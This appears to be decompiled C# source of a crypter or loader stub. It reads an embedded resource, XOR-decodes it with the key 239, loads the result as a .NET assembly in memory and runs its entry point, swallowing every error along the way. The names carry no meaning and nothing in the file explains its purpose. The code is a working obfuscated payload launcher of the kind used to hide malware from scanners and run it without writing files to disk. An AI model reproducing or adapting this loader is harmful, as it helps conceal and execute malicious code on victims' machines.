using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class obj
{
	public static object objNothing => null;

	public static int ZeroInt => 0;

	public static void objO(object objObj)
	{
		try
		{
			MethodInfo entryPoint = Assembly.Load((byte[])objObj).EntryPoint;
			entryPoint.Invoke(null, null);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void objRB(byte[] objD)
	{
		try
		{
			Thread thread = new Thread(objO);
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start(objD);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] EGA(string Inp)
	{
		checked
		{
			try
			{
				Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(Inp);
				int num = (int)manifestResourceStream.Length;
				byte[] buffer = new byte[num - 1 + 1];
				return new MemoryStream(buffer, 0, manifestResourceStream.Read(buffer, 0, num)).ToArray();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				byte[] result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static void objNE()
	{
	}

	public static byte[] objBytes()
	{
		return Encoding.Default.GetBytes(objX(Encoding.Default.GetString(EGA("_res32.resources")), 239));
	}

	public static string objX(string objTTE, int objK)
	{
		checked
		{
			try
			{
				StringBuilder stringBuilder = new StringBuilder(objTTE);
				StringBuilder stringBuilder2 = new StringBuilder(objTTE.Length);
				int num = objTTE.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					char c = stringBuilder[i];
					c = Strings.Chr(Strings.Asc(c) ^ objK);
					stringBuilder2.Append(c);
				}
				return stringBuilder2.ToString();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	[STAThread]
	public static void Main()
	{
		try
		{
			Thread thread = new Thread(objNE);
			thread.IsBackground = true;
			thread.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			objRB(objBytes());
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		Process.GetCurrentProcess().WaitForExit();
	}
}
